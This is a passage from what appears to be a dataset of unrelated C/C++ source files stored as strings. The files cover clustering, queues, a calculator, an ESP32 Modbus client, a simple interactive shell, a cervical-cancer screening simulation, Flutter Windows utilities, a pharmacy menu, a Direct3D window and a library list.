maximo radio (i.e. el radio cobertor)\n            if (point == c_medoid)\n                continue;\n            double distance = dist(c_medoid, point);\n            if (distance > c_radius)\n                c_radius = distance;\n        }\n        if (c_radius < minRadius) {\n            minRadius = c_radius;\n            medoid = c_medoid;\n        }\n    }\n    c.medoid = medoid;\n}\n\n// Vector no vacio\nPoint calculateMedoid(const vector <Point> &points) {\n    Point medoid;\n    if (points.size() <= 1) {\n        medoid = points[0];\n        return medoid;\n    }\n    double minRadius = DBL_MAX;\n    for (const Point &c_medoid : points) {   // Para cada punto elegido como posible medoide\n        double c_radius = 0.0;                  // Radio cobertor actual dado c_medoid como denominado medoide\n        for (const Point &point : points) {     // Calculamos su maximo radio (i.e. el radio cobertor)\n            if (point == c_medoid)\n                continue;\n            double distance = dist(c_medoid, point);\n            if (distance > c_radius)\n                c_radius = distance;\n        }\n        if (c_radius < minRadius) {\n            minRadius = c_radius;\n            medoid = c_medoid;\n        }\n    }\n    return medoid;\n}\n\nCluster clusterize(const vector<Point> &points) {\n    Cluster c;\n    c.points = points;\n    c.medoid =  calculateMedoid(points);\n    return c;\n}\n\nCluster clusterize(const Point &point) {\n    Cluster c;\n    c.points = {point};\n    c.medoid = point;\n    return c;\n}\n\nCluster clustUnion(const Cluster &c1, const Cluster &c2) {\n    vector<Point> points1 = c1.points;\n    vector<Point> points2 = c2.points;\n    points1.reserve(points1.size() + points2.size());\n    for (int i = 0; i < points2.size(); i++)\n        points1.push_back(points2[i]);\n    return clusterize(points1);\n}\n\n\n/***************************\n * RNG\n ***************************/\n\nvector<Point> randomPoints(const ull n, pair<double, double> range, optional<int> seed) { \n    mt19937 gen;\n    if (seed.has_value())\n        gen.seed(seed.value());\n    else {\n        random_device rd;\n        gen.seed(rd());\n    }\n\n    vector<Point> vector_point(n);\n    uniform_real_distribution<> dis(range.first, range.second);\n    for (ull i=0; i<n; i++)\n        vector_point[i] = {dis(gen), dis(gen)};\n    return vector_point;\n}\n\nPoint* randomPoints_static(const ull n, pair<double, double> range, optional<int> seed) {\n    mt19937 gen;\n    if (seed.has_value())\n        gen.seed(seed.value());\n    else {\n        random_device rd;\n        gen.seed(rd());\n    }\n\n    Point* P = new Point[n];\n    uniform_real_distribution<> dis(range.first, range.second);\n    for (ull i=0; i<n; i++)\n        P[i] = {dis(gen), dis(gen)};\n    return P;\n}\n\nvector<Cluster> randomSingletons(const ull n, pair<double, double> range, optional<int> seed) {\n    mt19937 gen;\n    if (seed.has_value())\n        gen.seed(seed.value());\n    else {\n        random_device rd;\n        gen.seed(rd());\n    }\n\n    vector<Cluster> vector_singleton(n);\n    random_device rd;\n    uniform_real_distribution<> dis(range.first, range.second);\n    for (ull i=0; i<n; i++)\n        vector_singleton[i] = clusterize({dis(gen), dis(gen)});\n    return vector_singleton;\n}",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint Data;\n\tnode* next;\n};\n\nnode* current = NULL;\nnode* Front = NULL;\nnode* Rear = NULL;\n\nvoid enqueue(int newdata)\n{\n\tnode* current = new node();\n\tcurrent->Data = newdata;\n\tif (Rear != NULL)\n\t{\n\t\tRear->next = current;\n\t\tRear = current;\n\t}\n\telse\n\t{\n\t\tFront = current;\n\t\tRear = current;\n\t}\n\tRear->next = NULL;\n}\nvoid dequeue()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\telse { cout << \"No element Found to be dequeued\" << endl; }\n}\nvoid dequeueAll()\n{\n\twhile (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\tFront = Front->next;\n\t\tdelete current;\n\t}\n\tRear = Front = NULL;\n}\nvoid display()\n{\n\tif (Front != NULL)\n\t{\n\t\tcurrent = Front;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->Data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse { cout << \"There is no data in the queue\\n\"; }\n}\nvoid app()\n{\n\t/*\n\t\top -> operation\n\t\tc -> confirm\n\t\te -> enqueue node\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, c, e, ao, s;\n\tcout << \"--- Welcome to queue implementation---\\n\";\n\tdo\n\t{\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Enqueue -> (1)\\n\";\n\t\tcout << \"Dequeue an Elements -> (2) \\n\";\n\t\tcout << \"Dequeue All Elements -> (3)\\n\";\n\t\tcout << \"Display -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tswitch (op)\n\t\t{\n\t\tcase 1:\n\t\t\tcout << \"Enter value do you want to enqueue\\n\";\n\t\t\tcin >> e;\n\t\t\tenqueue(e);\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tcout << \"Are you sure to dequeue one node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeue();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing first node :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\tcout << \"Are you sure to dequeue all nodes\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdequeueAll();\n\t\t\t\tcout << \"\\nCheck data of queue after dequeuing all nodes :\\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse {\n\t\t\t\tcout << \"Dequeue all is canceled\\n\";\n\t\t\t}\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\tcout << \"Enqueue Elements are:\\n\";\n\t\t\tdisplay();\n\t\t\tbreak;\n\t\tcase 5:\n\t\t\treturn;\n\t\t\tbreak;\n\t\tdefault:\n\t\t\tcout << \"Wrong Input Try Again\\n\";\n\t\t}\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include <iostream>\r\nusing namespace std;\r\n\r\n// Function to perform addition\r\ndouble add(double a, double b) {\r\n    return a + b;\r\n}\r\n\r\n// Function to perform subtraction\r\ndouble subtract(double a, double b) {\r\n    return a - b;\r\n}\r\n\r\n// Function to perform multiplication\r\ndouble multiply(double a, double b) {\r\n    return a * b;\r\n}\r\n\r\n// Function to perform division\r\ndouble divide(double a, double b) {\r\n    if (b == 0) {\r\n        cout << \"Error: Division by zero\\n\";\r\n        return 0;\r\n    }\r\n    return a / b;\r\n}\r\n\r\nint main() {\r\n    char op;\r\n    double num1, num2, result;\r\n\r\n    cout << \"Enter operator (+, -, *, /): \";\r\n    cin >> op;\r\n\r\n    cout << \"Enter two numbers: \";\r\n    cin >> num1 >> num2;\r\n\r\n    switch(op) {\r\n        case '+':\r\n            result = add(num1, num2);\r\n            cout << \"Result: \" << result << endl;\r\n            break;\r\n        case '-':\r\n            result = subtract(num1, num2);\r\n            cout << \"Result: \" << result << endl;\r\n            break;\r\n        case '*':\r\n            result = multiply(num1, num2);\r\n            cout << \"Result: \" << result << endl;\r\n            break;\r\n        case '/':\r\n            result = divide(num1, num2);\r\n            cout << \"Result: \" << result << endl;\r\n            break;\r\n        default:\r\n            cout << \"Error: Invalid operator\\n\";\r\n    }\r\n\r\n    return 0;\r\n}\r\n",
    "//Copyright (c) 2024 Dominik M. Glogowski\n//\n//Permission is hereby granted, free of charge, to any person obtaining a copy\n//of this software and associated documentation files (the \"Software\"), to deal\n//in the Software without restriction, including without limitation the rights\n//to use, copy, modify, merge, publish, distribute, sublicense, and/or sell\n//copies of the Software, and to permit persons to whom the Software is\n//furnished to do so, subject to the following conditions:\n//\n//The above copyright notice and this permission notice shall be included in all\n//copies or substantial portions of the Software.\n//\n//THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\n//SOFTWARE.\n\n#include <DynamicModbusMaster.h>\n#include <ModbusErrorHelper.h>\n#include <sdkconfig.h>\n#include <esp_log.h>\n#include <inttypes.h>\n#include \"SingleSlaveExampleDevice.h\"\n\ndynamic_modbus_master::DynamicModbusMaster master;\n\ndynamic_modbus_master::ModbusConfig config {\n    .uartPort = static_cast<uart_port_t>(CONFIG_MB_UART_PORT_NUM),\n    .rxdPin = CONFIG_MB_UART_RXD,\n    .txdPin = CONFIG_MB_UART_TXD,\n    .rtsPin = CONFIG_MB_UART_RTS,\n    .baudRate = CONFIG_MB_UART_BAUD_RATE,\n    #ifdef CONFIG_MB_COMM_MODE_RTU\n    .modbusMode = MB_MODE_RTU,\n    #elif CONFIG_MB_COMM_MODE_ASCII\n    .modbusMode = MB_MODE_ASCII\n    #endif\n};\n\nSingleSlaveExampleDevice g_exampleDevice(1, 1);\n\nextern \"C\" void app_main() {\n    dynamic_modbus_master::ModbusError error = master.initialise(config);\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"app_main\", \"Modbus initialization failed: %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n        return;\n    }\n    \n    error = master.start();\n    if (error != dynamic_modbus_master::ModbusError::OK) {\n        ESP_LOGE(\"app_main\", \"Modbus start failed: %s\", dynamic_modbus_master::ModbusErrorHelper::modbusErrorToName(error).c_str());\n        return;\n    }\n    \n    while(true) {\n        auto singleRegisterData = g_exampleDevice.readExampleSingleRegister();\n        auto multipleRegisterData = g_exampleDevice.readExampleMultipleRegisters();\n        auto floatRegisterData = g_exampleDevice.readExampleFloat();\n        auto singleCoilValue = g_exampleDevice.readExampleSingleCoil();\n        auto multipleCoilValue = g_exampleDevice.readExampleMultipleCoils();\n        auto discreteInputValue = g_exampleDevice.readDiscreteInput();\n        auto inputValue = g_exampleDevice.readInput();\n        \n        ESP_LOGI(\"Example Device\", \"Single Register Read: %u ; Multiple Register Read: %\" PRIu32 \" ; Float Register Read: %f\", singleRegisterData, multipleRegisterData, floatRegisterData);\n        ESP_LOGI(\"Example Device\", \"Single Coil Read: %s ; Multiple Coil Read: %u\", (singleCoilValue ? \"On\" : \"Off\"), multipleCoilValue);\n        ESP_LOGI(\"Example Device\", \"Discrete Input State: %s ; Input Value: %u\", (discreteInputValue ? \"On\" : \"Off\"), inputValue);\n        \n        singleRegisterData++;\n        multipleRegisterData++;\n        floatRegisterData++;\n        singleCoilValue = !singleCoilValue;\n        multipleCoilValue++;\n        \n        g_exampleDevice.writeExampleSingleRegister(singleRegisterData);\n        g_exampleDevice.writeExampleMultipleRegisters(multipleRegisterData);\n        g_exampleDevice.writeExampleFloat(floatRegisterData);\n        g_exampleDevice.writeExampleSingleCoil(singleCoilValue);\n        g_exampleDevice.writeExampleMultipleCoils(multipleCoilValue);\n        \n        vTaskDelay(pdMS_TO_TICKS(1000));\n    }\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <cstring>\n#include <unistd.h>\n#include <sys/wait.h>\n#include <sys/stat.h>\n#include <pwd.h>\n#include <filesystem>\n\nusing namespace std;\n\nstring prompt;\nstring welcome;\nstring input;\n\n// Defining methods\nstring getHomeDirectory();\nstring formatText(const string &value);\nint shell();\nint executeCommand(string command);\nint executeCommandFromFile(string file);\nint help(string parameters);\nint echo(string text);\nint set(string parameters);\nint writeWelcome();\nint getWelcome();\nint writePrompt();\nint getPrompt();\nint createConfigDir();\n\nint main(int argc, char *argv[])\n{\n    if (argc >= 3 && strcmp(argv[1], \"-c\") == 0)\n    {\n        string command;\n        for (int args = 2; args < argc; args++)\n        {\n            cout << args;\n            command.append(argv[args]);\n            command.append(\" \");\n        }\n        executeCommand(command);\n        cout << command;\n        exit(0);\n    }\n\n    // Get prompt from configuration and if not set use default prompt\n    if (getPrompt())\n    {\n        cout << \"Run \\\"set prompt\\\" to set a prompt.\" << endl;\n        prompt = \"\\033[36m[{username}@{hostname}] \\033[37m{cwd} \\033[36m$ \";\n        writePrompt();\n    }\n\n    // Get welcome from configuration and apply placeholders and colors\n    getWelcome();\n    if (welcome != \"\")\n    {\n        cout << formatText(welcome) << endl;\n    }\n\n    while (true)\n    {\n        shell();\n    }\n}\n\n// Prompt and input handler\nint shell()\n{\n    cout << formatText(prompt) + \"\\033[0m\";\n    getline(cin, input);\n    executeCommand(input);\n    return 0;\n}\n\n// Executes a command\nint executeCommand(string command)\n{\n    if (command.find(\"cd \") == 0)\n    {\n        chdir(command.substr(3).data());\n    }\n    else if (command.find(\"set\") == 0)\n    {\n        if (command.size() >= 4)\n        {\n            set(command.substr(4).data());\n        }\n        else\n        {\n            set(\"\");\n        }\n    }\n    else if (command.find(\"exit\") == 0)\n    {\n        int exitcode = 1;\n        if (command.size() > 5)\n        {\n            exitcode = stoi(command.substr(5));\n        }\n        exit(exitcode);\n    }\n    else if (command.find(\"echo\") == 0)\n    {\n        if (command.size() > 5)\n        {\n            echo(command.substr(5).data());\n        }\n    }\n    else if (command.find(\"help\") == 0)\n    {\n        if (command.size() > 5)\n        {\n            help(command.substr(5).data());\n        }\n        else\n        {\n            help(\"\");\n        }\n    }\n    else if (command != \"\")\n    {\n        executeCommandFromFile(command);\n    }\n    return 0;\n}\n\n// Executes a file\nint executeCommandFromFile(string file)\n{\n    istringstream iss(file);\n    vector<char *> args;\n    string arg;\n    while (iss >> arg)\n    {\n        args.push_back(strdup(arg.c_str()));\n    }\n    args.push_back(nullptr);\n\n    pid_t pid = fork();\n    if (pid == 0)\n    {\n        if (execvp(args[0], const_cast<char *const *>(args.data())) == -1)\n        {\n            if (errno == ENOENT)\n            {\n                cerr << \"Error: Command '\" << file << \"' not found.\" << endl;\n                exit(1);\n            }\n        }\n    }\n    else if (pid > 0)\n    {\n        wait(NULL);\n    }\n    else\n    {\n        cout << \"Failed to fork process.\" << endl;\n    }\n    for (auto &arg : args)\n    {\n        free(arg);\n    }\n    return 0;\n}\n\n// Shows the help message\nint help(string parameters)\n{\n    if (parameters == \"commands\")\n    {\n        cout << \"Shelly provides the following built-in commands:\\n\\n\"\n                     \"- set <prompt/placeholder> <value>: Allows changing the prompt or placeholder.\\n\"\n                     \"- cd <directory>: Changes the current directory.\\n\"\n                     \"- echo [text]: Writes text to the console.\\n\"\n                     \"- exit [exit code]: Exits the shell.\\n\";\n    }\n    else if (parameters == \"placeholders\")\n    {\n        cout << \"Placeholders are a symbolic representation of something that will later be replaced with it's actual value later by the shell. This can be used in your prompt or welcome message.\\n\\n\"\n                     \"- {cwd}: Current working directory.\\n\"\n                     \"- {username}: Username of the current user.\\n\"\n                     \"- {hostname}: Hostname (PC name).\\n\";\n    }\n    else if (parameters == \"colors\")\n    {\n        cout << \"You can use the \\\\033[Xm sequence to adjust the foreground and background colors of your prompt or welcome message text. Simply substitute 'X' with the appropriate color code from the provided table:\\n\\n\"\n                     \"| Color Name  | Foreground Color Code  | Background Color Code |\\n\"\n                     \"| Black       | 30                     | 40                    |\\n\"\n                     \"| Red         | 31                     | 41                    |\\n\"\n                     \"| Green       | 32                     | 42                    |\\n\"\n                     \"| Yellow      | 33                     | 43 ",
    " // Cervix Screening Program CSP\r\n// Marcel Greuter\r\n// 22 july 2021 - initial version 01\r\n// 24 july 2021 - version 02 sensitivities adapted according to values in Model01.pptx\r\n// 1 oct 2021 - version 03 MG: changed and corrected transition probabilities\r\n// 14 nov 2021 - trial version 04 MG: first cost-effectiveness version\r\n// 19 nov 2021 - bug fixed in readCumDeathProb, version ready for testing\r\n// 29 nov 2021 - final version 04 for testing... :)\r\n// 31 jan 2022 - after revision of the flow chart, version 05 was build, now ready for testing...\r\n// 4 feb 2022 - Version with new flow chart implemented\r\n// 5 feb 2022 - Debug function added to check flow chart\r\n// 6 feb 2022 -\tsurvival as a function of FIGO state coded\r\n// to do: false positives have to be added, compliance function has to be adapted, all parameters to an input file\r\n// 11 feb 2022 - version 06. adapted det file\r\n// 23 mrt 2022 - version 07. New flow chart\r\n// 31 mrt 2022 - update FIGO distribution and Survival (IKNL data)\r\n// 10 apr 2022 - Update survival as a function of stage and age: see routine TumorSurvival\r\n// 28 apr 2022 - Update Confirmatory diagnosis\r\n// 9 may 2022 - Check on opening output files, corrected CIN2 and CIN3 to HPV+ transition\r\n// 1 july 2022 - Add a screening test at age 65 if HPV+\r\n// 8 july 2022 - Version 11. Added number of detected stages in the output\r\n// 13 july 2022 - Number of detected stages per age in the output, compliance function also includes age 65\r\n// 21 july 2022 - Ndetected only counted for direct referrals. There was no Ndetected for age 65 because there are 8 screen ages, not 7: this has been corrected.\r\n// 25 july 2022 - Version 12. False positives included\r\n// 2 jan 2023 - Version 13b. Base case scenario\r\n// 12 jan 2023 - Version 13_1. Scenario 1. Age of death added to output, independent of participation in screening\r\n// 17 jul 2023 - Number of iterations include by Nit\r\n\r\n\r\n#include <iostream> \r\n#include <cstdlib> \r\n#include <time.h>\r\n#include <cmath>\r\n#include <conio.h>\r\n\r\n#define ScreeningOn 1// turn screening on or off\r\n#define Nwomen 100000\r\n#define debug 0\r\n#define Nit 10 \r\n\r\nusing namespace std; \r\n\r\nint CurrentState = 0 ;\r\nint age = 0 ;\r\nfloat cumDeathProb[101] ;\r\nint NFalsePositive = 0 ;\r\nfloat costs ;\r\nFILE *fp2 ;\r\nint FIGOstate ;\r\n\r\nint DetScreenAge = 0 ;\r\nint DetCompliance = 0 ;\r\nint DetReferral = 0 ;\r\nint DetState = -1 ;\r\nint DetFIGO = -1 ;\r\nfloat DetDeathAge = -1 ;\r\nfloat DetNaturalDeathAge = -1 ;\r\nint DetTreatment = 0 ;\t\t\t\t\t\t\t\t\t\t\t\t// 13-01-23 added\r\n\r\nint Ndetected[8][6] ; \t\t\t\t\t\t\t\t\t\t\t\t// detected lesions for 8 ages: 30, 35..65 and 6 stages: HPV-, HPV+, ... cancer \r\n\r\ndouble Random()\r\n{\r\n\treturn (double)rand() / (double)((unsigned)RAND_MAX + 1 ) ;\r\n}\r\n\r\nvoid HPVmin( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 0\r\n{\r\n\tdouble rnd = Random() ;\r\n\tif ( ( age >= 15 ) and ( age <= 24 ) and ( rnd < 0.074 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 25 ) and ( age <= 34 ) and ( rnd < 0.098 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 35 ) and ( age <= 44 ) and ( rnd < 0.050 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 45 ) and ( age <= 54 ) and ( rnd < 0.036 ) )\r\n\t\tCurrentState = 1 ;\r\n\tif ( ( age >= 55 ) and ( rnd < 0.027 ) )\r\n\t\tCurrentState = 1 ;\r\n\r\n}\r\n\r\nvoid HPVplus( void )\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 1\r\n{\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.5034 ) \r\n\t\tCurrentState = 0 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.5034+0.0610 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.5034+0.0610+0.0034 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif ( rnd < 0.5034+0.0610+0.0034+0.0072  ) \r\n\t\t\t\t\t\tCurrentState = 4 ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid CIN1( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 2\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.4000 ) \r\n\t\tCurrentState = 0 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.4000+0.1600 ) \r\n\t\t\tCurrentState = 1 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif( rnd < 0.4000+0.1600+0.0242 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif( rnd < 0.4000+0.1600+0.0242+0.0047 ) \r\n\t\t\t\t\tCurrentState = 4 ;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\t\t\r\n\r\nvoid CIN2( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 3\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.0073 ) \r\n\t\tCurrentState = 1 ; \r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.0073+0.0244 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.0073+0.0244+0.0474 ) \r\n\t\t\t\tCurrentState = 4 ;\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid CIN3( void )\t\t\t\t\t\t\t\t\t\t\t\t\t// CurrentState = 4\r\n{\t\r\n\tdouble rnd = Random() ;\r\n\tif ( rnd < 0.0025 ) \r\n\t\tCurrentState = 1 ;\r\n\telse\r\n\t{\r\n\t\tif ( rnd < 0.0025+0.0074 ) \r\n\t\t\tCurrentState = 2 ;\r\n\t\telse\r\n\t\t{\r\n\t\t\tif ( rnd < 0.0025+0.0074+0.0486 ) \r\n\t\t\t\tCurrentState = 3 ;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif ( rnd < 0.0025+0.0074+0.0486+0.04) \r\n\t\t\t\t\tCurrentState = 5 ;\t\t\t\t\t\t\r\n\t\t\t}\r\n\t\t}\r\n\t} \r\n\t\r\n\t\r\n// testing:\tCurrentState = 5 ;\r\n}\r\n\r\ndouble TumorSurvival( int age, int cc ) // Survivalprobability is given by y=a*exp(bt)+c\r\n{\r\n\tdouble y = Random() ;\r\n\tdouble t ;\r\n\tint j ;\r\n\tconst double a[5][7] = { {  2.010455946,  1.587227382,   1.891873867,  4.999864589,  9.895077586,  50.0,         76.9734858 },\r\n\t                         { 13.85142061,\t 12.08714041,   19.167867",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"index.h\"\n\nint main() {\n\tList Prescription_Queue;\n\tQueue IMP_BiLL_Queue, EXP_BiLL_Queue;\n\tPrescription_Queue.init(); IMP_BiLL_Queue.init(), EXP_BiLL_Queue.init();\n\tFILE* don_thuoc    = fopen(FILE_DON_THUOC  , \"r\");\n\tFILE* hoa_don_nhap = fopen(FILE_HOA_DON_NHAP, \"r\");\n\tFILE* hoa_don_xuat = fopen(FILE_HOA_DON_XUAT, \"r\");\n\tint choice;\n\tdo {\n\t\tsystem(\"cls\");\n\t\tMenu(1, 8);\n\t\tgetChoice(choice, 0, 8);\n\t\tswitch (choice)\t{\n\t\t\tcase 0: exit(0); break;\n\t\t\tcase 1: KHOI_TAO_DS_DON_THUOC(Prescription_Queue, don_thuoc); break;\n\t\t\tcase 2: LAP_HOA_DON(IMP_BiLL_Queue, EXP_BiLL_Queue, hoa_don_nhap, hoa_don_xuat); break;\n\t\t\tcase 3: TIM_KIEM_DON_THUOC(Prescription_Queue, IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 4: IN_DANH_SACH_HOA_DON(IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 5: TIM_THONG_TIN_DON_THUOC(IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 6: IN_RA_THONG_TIN_CAC_DON_THUOC_TON_SLG_LON_HON_N(100, IMP_BiLL_Queue, EXP_BiLL_Queue); break;\n\t\t\tcase 7: THONG_KE_THUOC_CO_THOI_HAN_SU_DUNG_DUOI_30_NGAY(IMP_BiLL_Queue); break;\n\t\t\tcase 8: XOA_DON_THUOC(Prescription_Queue, IMP_BiLL_Queue); break;\n\t\t}\n\t\tsystem(\"pause>0\");\n\t} while(choice);\n\tfclose(don_thuoc); fclose(hoa_don_nhap); fclose(hoa_don_xuat);\n\treturn (0);\n}\n",
    "#include \"Vertexium.hpp\"\n\nconst VERTEX VERTICES[3] =\n{\n    { 0.0f,  0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    {-0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},   \n    { 0.5f, -0.5f, 0.0f, { 0.0f, 0.0f, 1.0f, 1.0f }},\n\n};\n\n                                                           //forward decs\n                                            HWND hWnd; WNDCLASSEX wc; class D3D;\n\nint WINAPI WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)\n{\n    ZeroMemory(&wc, sizeof(WNDCLASSEX));\n\n                                            wc.cbSize = sizeof(WNDCLASSEX);\n                                            wc.style = CS_HREDRAW | CS_VREDRAW;\n                                            wc.lpfnWndProc = WinProc;\n                                            wc.hInstance = hInstance;\n                                            wc.hCursor = LoadCursor(NULL, IDC_ARROW);\n                                            wc.lpszClassName = L\"WindowClass\";\n\n    RegisterClassEx(&wc);\n\n    RECT wr = { 0, 0, 800, 600 };\n    AdjustWindowRect(&wr, WS_OVERLAPPEDWINDOW, FALSE);\n\n    hWnd = CreateWindowEx\n    (\n                                            NULL,\n                                            L\"WindowClass\",\n                                            L\"I Love Vertices <3\",\n                                            WS_OVERLAPPEDWINDOW,\n                                            300,\n                                            300,\n                                            800,\n                                            800,\n                                            NULL,\n                                            NULL,\n                                            hInstance,\n                                            NULL\n    );\n\n    ShowWindow(hWnd, nCmdShow);\n\n    D3D* myD3D = new D3D;\n    myD3D->InitD3D(hWnd);myD3D->CompileShaders();myD3D->CreateBuffers(VERTICES);myD3D->DebugMemoryAddressesAndCompilation();\n\n    MSG message;\n    while(1)\n    {\n        if(PeekMessage(&message, NULL,0,0,PM_REMOVE))\n        {\n            TranslateMessage(&message);\n            DispatchMessage(&message);\n\n            if (message.message == WM_QUIT)\n                break;\n        }\n        else\n        {\n            myD3D->RenderFrame();\n        }\n    }\n\n    myD3D->ReleaseD3D(myD3D->swapChain, myD3D->device, myD3D->context, myD3D->p_BackBuffer, myD3D->p_VertexShader, myD3D->p_PixelShader);\n    return message.wParam;\n}",
    "#include \"iostream\"\nusing namespace std;\nconst int max_node = 10;\nstruct node\n{\n    int book_no = -1;\n    string title;\n    string author;\n    string isbn;\n    int availability_stat;\n    int next = 0;\n};\nnode a[max_node];\nint create()\n{\n    int head, i;\n    cout << \"Enter index of first node: \";\n    cin >> i;\n    head = i;\n    while (i != 0)\n    {\n        cout << \"Enter book number : \" << endl;\n        cin >> a[i].book_no;\n        cout << endl;\n        cout << \"Enter Title of the Book : \";\n        cin >> a[i].title;\n        cout << endl;\n        cout << \"Enter Author : \";\n        cin >> a[i].author;\n        cout << \"Enter ISBN : \";\n        cin >> a[i].isbn;\n        cout << endl;\n        cout << \"Enter availability status : \";\n        cin >> a[i].availability_stat;\n        cout << endl;\n        cout << \"Enter index of next book(press 0 to stop) : \";\n        cin >> a[i].next;\n        cout << endl;\n        i = a[i].next;\n    }\n    return head;\n}\nvoid display_search(int head)\n{\n    cout << \"\\n\\nBook No\\t|\\tTitle\\t|\\tAuthor\\t|\\tISBN\\t| 